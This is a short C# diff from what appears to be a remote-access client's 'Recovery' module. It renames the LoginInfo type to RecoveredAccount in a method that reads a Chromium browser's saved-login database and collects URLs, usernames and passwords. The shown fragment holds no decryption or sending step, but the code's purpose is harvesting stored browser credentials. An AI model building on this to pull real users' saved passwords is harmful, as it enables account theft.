@@ -3,15 +3,16 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
+using xClient.Core.Data;
 using xClient.Core.Utilities;
 
 namespace xClient.Core.Recovery.Utilities
 {
     public class ChromiumBase
     {
-        public static List<LoginInfo> Passwords(string datapath, string browser)
+        public static List<RecoveredAccount> Passwords(string datapath, string browser)
         {
-            List<LoginInfo> data = new List<LoginInfo>();
+            List<RecoveredAccount> data = new List<RecoveredAccount>();
             SQLiteHandler SQLDatabase = null;
 
             if (!File.Exists(datapath))
@@ -44,7 +45,7 @@ namespace xClient.Core.Recovery.Utilities
 
                     if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
                     {
-                        data.Add(new LoginInfo
+                        data.Add(new RecoveredAccount
                         {
                             URL = host,
                             Username = user,
